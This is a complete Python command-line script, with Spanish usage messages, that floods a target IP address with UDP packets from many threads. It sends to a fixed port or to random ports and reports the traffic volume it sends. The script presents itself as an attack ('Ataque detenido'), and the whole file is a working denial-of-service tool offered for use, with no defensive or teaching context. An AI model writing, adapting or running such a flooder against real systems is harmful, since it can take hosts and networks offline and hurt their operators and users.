import sys
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import time, sleep

class Brutalize:
    def __init__(self, ip, port, packet_size, threads):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.threads = threads
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.packet_size)
        self.len = len(self.data)
        self.on = False
        self.sent = 0
        self.total = 0

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send, daemon=True).start()
        Thread(target=self.info, daemon=True).start()

    def info(self):
        interval = 0.05
        mb = 1000000
        gb = 1000000000
        size = 0
        self.total = 0
        last_time = time()
        while self.on:
            sleep(interval)
            if not self.on:
                break
            now = time()
            if now - last_time >= 1:
                size = round(self.sent / mb)
                self.total += self.sent / gb
                print(f"{size} Mb/s - Total: {round(self.total, 2)} Gb.", end='\r')
                self.sent = 0
                last_time = now

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except Exception:
                pass

    def _randport(self):
        return self.port or randint(1, 65535)

def main():
    if len(sys.argv) < 5:
        print(f"Uso: python3 {sys.argv[0]} <ip> <port> <packet_size> <threads>")
        sys.exit(1)
    ip = sys.argv[1]
    try:
        port = int(sys.argv[2])
        packet_size = int(sys.argv[3])
        threads = int(sys.argv[4])
    except ValueError:
        print("Port, packet_size y threads deben ser enteros.")
        sys.exit(1)
    brute = Brutalize(ip, port, packet_size, threads)
    try:
        brute.flood()
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(f"\nAtaque detenido. Total enviado: {round(brute.total, 2)} Gb.")

if __name__ == '__main__':
    main()
